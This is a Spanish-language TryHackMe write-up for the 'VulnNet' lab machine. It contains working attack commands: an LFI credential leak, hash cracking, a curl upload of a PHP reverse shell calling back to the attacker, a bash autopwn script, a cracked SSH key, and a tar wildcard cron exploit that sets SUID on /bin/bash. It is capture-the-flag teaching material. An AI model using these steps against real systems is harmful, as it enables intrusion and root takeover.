---
layout: single
title: VulnNet - Try Hack Me
excerpt: "En esta máquina empezamos encontrando entre algunos subdominios ocultos uno donde necesitamos credenciales para acceder, conseguimos las credenciales de acceso gracias a un LFI por medio de un parametro de lde la web mal sanitizado, subimos una shell al servidor consiguiendo RCE como el usuario www-data, luego de esto escalamos privilegios convirtiendonos en el usuario server-management luego de encontrar una id_rsa y finalmente logrando convertirnos en root abusando de un wildcard con tar en una tarea cron"
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/thm-writeup-vulnnet/VulnNet.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.png
categories:
  - tryhackme
  - scripting
tags:
  - bash scripting
  - autopwm
  - web
  - lfi
  - wildcard
  - cron
  - tar
---

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img_header.png">
</p>

Empezamos añadiendo el dominio **vulnnet.thm** al ```/etc/hosts``` como se nos menciona en la página

Una vez hecho esto empezamos con el escaneo de puertos con nmap

```bash
~$> nmap -p- --open -T5 -v -n vulnnet.thm
```
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 01:08 -05
Initiating Ping Scan at 01:08
Scanning vulnnet.thm (10.10.54.94) [2 ports]
Completed Ping Scan at 01:08, 0.20s elapsed (1 total hosts)
Scanning vulnnet.thm (10.10.54.94) [65535 ports]
Discovered open port 80/tcp on 10.10.54.94
Discovered open port 22/tcp on 10.10.54.94
Nmap scan report for vulnnet.thm (10.10.54.94)
Not shown: 43285 closed ports, 22248 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 114.94 seconds
```
Vemos que hay 2 puertos externamente visibles

  - ```80``` -> http
  - ```22``` -> ssh

Ya que el 80 está abierto, veamoslo desde el navegador

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img1.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img2.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img3.png">
</p>

Despues de un rato buscando, no encontré nada interesante así que procedí usando **wfuzz**, para buscar directorios interesantes de la siguiente forma:

```bash
~$> wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://vulnnet.thm/FUZZ
```

  - ```-c``` -> Formato **colorizado**
  - ```--hc``` -> **Ocultando** las respuestas con el **código** de estado **404**
  - ```-w``` -> Wordlist
  - ```FUZZ``` -> Lugar donde se aplicara el **fuzzing**

Obteniendo esto:

```bash
Target: http://vulnnet.thm/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                   
=====================================================================

000000025:   301        9 L      28 W       308 Ch      "img"                                                     
000000536:   301        9 L      28 W       308 Ch      "css"
000000939:   301        9 L      28 W       307 Ch      "js"
000002757:   301        9 L      28 W       310 Ch      "fonts"
```
En un principio puede parecer que no hay nada de interes, ya que los directorios que encontramos son bastante comunes, pero si vemos el directorio **js** encontramos **3** ficheros de los cuales nos interesa uno que contiene algo que nos puede servir

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img4.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img5.png">
</p>

Al abrirlo vemos el código **ofuscado**, podríamos **deobfuscarlo** en algúna página online, para que sea más legible, pero lo que nos interesa lo podemos ver sin necesidad de esto

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img6.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img7.png">
</p>

Vemos que dentro de la página principal hay un **parametro** (referer) que no habíamos visto antes, si lo usamos para intentar ver archivos locales de la máquina, nos damos cuenta que hay **LFI**

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img8.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img9.png">
</p>

No podemos visualizar los logs, por lo que no podremos efectuar un log poisoning, pero encontramos algo muy interesante en el directorio ```/etc/apache2/```, un fichero ```.htpasswd``` que contiene credenciales que podremos usar más adelante!

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img10.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img11.png">
</p>

Rompemos la clave con john usando el rockyou.txt

```bash
~$> echo "developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0" > hash 
```
```bash
~$> john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
```bash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9<***CENSORED***>s   (developers)
1g 0:00:00:11 DONE (2021-07-17 21:51) 0.08928g/s 192960p/s 192960c/s 192960C/s 99876543219..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Estas credenciales no nos serán útiles para conectarnos por ssh, así que vamos a buscar subdominios donde podamos usarlas con **gobuster**

Yo usaré un wordlist bastante bueno de [este](https://github.com/danielmiessler/SecLists) repositorio de github

```bash
~$> gobuster vhost -u vulnnet.thm -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://vulnnet.thm
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/08/31 02:21:17 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.vulnnet.thm (Status: 400) [Size: 424]
Found: broadcast.vulnnet.thm (Status: 401) [Size: 468]
```
Luego de un rato encontramos **2** subdominios, añadimos **broadcast.vulnnet.thm** junto a **vulnnet.thm** en el ```/etc/hosts```

```bash
=================================================
 /etc/hosts
==================================================
<VULNNET_IP>	vulnnet.thm broadcast.vulnnet.thm
```
Y entramos desde la web
Vemos que nos pide credenciales, le proporcionamos las anteriormente encontradas y entramos!

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img12.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img13.png">
</p>

Vemos que estamos ante un **clipbucket**, buscando un poco por **exploit-db** encontramos que podemos subir un archivo php con curl, pero antes de esto debemos preparar una shell:

```bash
~$> cp /usr/share/webshells/php/php-reverse-shell.php . && cat php-reverse-shell.php | sed 's/127.0.0.1/<TU_IP>/' | sed 's/1234/443/' > shell.php
```
Una vez hecho esto podemos ejecutar el siguiente comando para subir nuestra shell: 

```bash
~$> curl -s -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u "developers:9<***CENSORED***>s"
```
```bash
{"success":"yes","file_name":"1630396316db603c","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```

Nos dirigimos a
```html
http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/
```
que es donde está nuestra shell

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img14.png">
</p>

<p align="center">
<img src="/assets/images/thm-writeup-vulnnet/img15.png">
</p>

Nos ponemos en escucha con netcat por el puerto 443

```bash
~$> nc -nlvp 443
listening on [any] 443 ...
```

Abrimos nustro fichero subido a la web y obtenemos shell

```bash
connect to [10.9.242.217] from (UNKNOWN) [10.10.55.168] 49674
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:00:18 up 25 min,  0 users,  load average: 0.00, 0.01, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data
```
Para automatizar todo este proceso decidí crear un pequeño script en bash, que no es muy útil una vez ya llegamos hasta aquí, pero aquí está

```bash
#!/bin/bash

#Colors
greenColor="\e[0;32m\033[1m"
endColor="\033[0m\e[0m"
redColor="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColor="\e[0;33m\033[1m"
turquoiseColor="\e[0;36m\033[1m"
grayColor="\e[0;37m\033[1m"

function ctrl_c(){
	echo -e "\n\n${redColor}[!] Exiting...${endColor}\n"
	exit 1
}

trap ctrl_c INT

declare -r ip=$1
declare -r port=$2
declare -r developers_credentials="developers:9<***CENSORED***>s" # <- CHANGE THIS

function helpPanel(){
	echo -e "\n${yellowColor}[${endColor}${redColor}!${endColor}${yellowColor}] Use${endColor} ${turquoiseColor}$0 ${endColor}${redColor}<${endColor}${grayColor}YOUR_IP${endColor}${redColor}> <${grayColor}PORT${redColor}>${endColor}"
	exit 1
}

function uploadYgainShell(){
	tput civis
	echo -e "\n${yellowColor}[${endColor}${blueColor}*${endColor}${yellowColor}] Uploading the reverse shell..."

	cp /usr/share/webshells/php/php-reverse-shell.php . && cat php-reverse-shell.php | sed 's/127.0.0.1/'$ip'/' | sed 's/1234/'$port'/' > shell.php
	file_name=$(curl -s -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u "$developers_credentials" | grep "file_name" | awk '{print $3}' FS=":" | grep -oP "\".*?\"" | head -n 1 | tr -d '"')

	if [ "$(echo $?)" == "0" ]; then
		echo -e "\n${yellowColor}[${endColor}${greenColor}+${endColor}${yellowColor}] Shell uploaded correctly${endColor}" && sleep 0.5
		echo -e "\n${yellowColor}[${endColor}${blueColor}*${endColor}${yellowColor}] Waiting for connection on port $2${endColor}" && sleep 0.5

		qterminal -e nc -nlvp $port &
        	disown; rm php-reverse-shell.php shell.php
		echo -e "\n${yellowColor}[${endColor}${greenColor}+${endColor}${yellowColor}] Gaining shell as www-data user${endColor}\n" && curl -s "http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/"$file_name".php" --user "developers:9972761drmfsls" > /dev/null 2>&1 &
        		if [ "$(echo $?)" != "0" ]; then
        			echo -e "\n${redColor}[x] Connection couldn't be established${endColor}"
        			tput cnorm; exit 1
        		fi
	else
		echo -e "\n${redColor}[x] An error was ocurred${endColor}"
		exit 1
	fi
	tput cnorm
}

#----------------------------------------------->

if [[ ! "$ip" || ! "$port" ]]; then
	helpPanel
else
	uploadYgainShell
fi
```
Siguiendo con la escalada de privilegios para convertirnos en el usuario server-management, primero hacemos un tratamiento de la tty como ya lo expliqué en [este](https://invertebr4do.github.io/tratamiento-de-tty/) post, esto básicamente para tener una tty full interactiva
Encontramos un directorio que puede ser de mucha utilidad: ```/var/backups``` en este vemos un ```ssh-backup.tar.gz```

Nos metemos en /tmp

```bash
$ cd /tmp
```
Copiamos el ```ssh-backup.tar.gz``` dentro del directorio ```/tmp```

```bash
$ cp ssh-backup.tar.gz /tmp/.
```
Lo descomprimimos con **tar**

```bash
$ tar -xf ssh-backup.tar.gz
```
Y vemos que tenemos una id_rsa

```bash
$ ls
id_rsa
ssh-backup.tar.gz
```
Si la intentamos usar, veremos que nos pedirá contraseña, así que vamos a copiarnola en unestra máquina de atacante e intentemos romperla con [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)

```bash
~$> echo "-----BEGIN RSA PRIVATE KEY-----  
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----" > id_rsa_to_crack
```
Usamos **ssh2john**

```bash
~$>./ssh2john.py id_rsa_to_crack > id_rsa
```
Y despues **john** para romperla

```bash
~$> john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa
```
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
o<***CENSORED***>c     (id_rsa)
1g 0:00:00:13 DONE (2021-08-31 03:40) 0.07570g/s 1085Kp/s 1085Kc/s 1085KC/sa6_123..*7¡Vamos!
Session completed
```
Ahora le asignamos el privilegio ```600``` a ```id_rsa``` para que no nos de problemas al momento de usarla

```bash
~$> chmod 600 id_rsa
```
Y la usamos para conectarnos por **ssh** como el usuario **server-management**

```bash
~$> ssh -i id_rsa server-management@vulnnet.thm
Enter passphrase for key 'id_rsa':
```
```bash
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

560 packages can be updated.
359 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

server-management@vulnnet:~$ whoami
server-management
```
Ahora podemos ver el ```user.txt```

```bash
server-management@vulnnet:~$ cat user.txt 
THM{9<***CENSORED***>b}
```

Para obtener el root debemos de escalar privilegios abusando de un **wildcard** dentro de un archivo que usa **tar**
Este archivo está dentro de ```/var/opt``` y contiene lo siguiente:

```bash
server-management@vulnnet:~$ cat /var/opt/backupsrv.sh
```
```bash
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```
Básicamente se encarga de hacer backups de todo lo que esté dentro del directorio ```/home/server-management/Documents``` durante intervalos regulares de tiempo (tarea **cron**)

```bash
server-management@vulnnet:~$ cat /etc/crontab
```
```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh # <- ESTE ES EL QUE NOS INTERESA
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
Finalmente para obtener el root, entramos en ```/home/server-management/Documents```

```bash
server-management@vulnnet:~$ cd Documents
```
Ejecutamos los siguientes comandos:

```bash
server-management@vulnnet:~/Documents$ echo "chmod 4755 /bin/bash" > privesc.sh
server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh privesc.sh"
server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
```

Esto nos creará archivos con nombres de parametros de **tar**, por lo que cuando se ejecute el script y tar englobe todos los archivos con el wildcard, se confundirá con los nombres de los ficheros que creamos, ejecutando la instrución maliciosa que querramos, en este caso asignar privilegios **SUID** a la ```/bin/bash``` (chmod 4755 /bin/bash)

Esperamos un poco despues de lo anterior y abusamos del privilegio **SUID** que se le asignó a la ```/bin/bash```

```bash
server-management@vulnnet:~/Documents$ bash -p
```
  - ```-p``` -> Para **atender** al privilegio **SUID**

Vemos que somos root

```bash
bash-4.4# whoami
root
```
Y podemos leer la flag **root.txt**

```bash
bash-4.4# cat /root/root.txt
THM{2<***CENSORED***>a}
```
**:)**
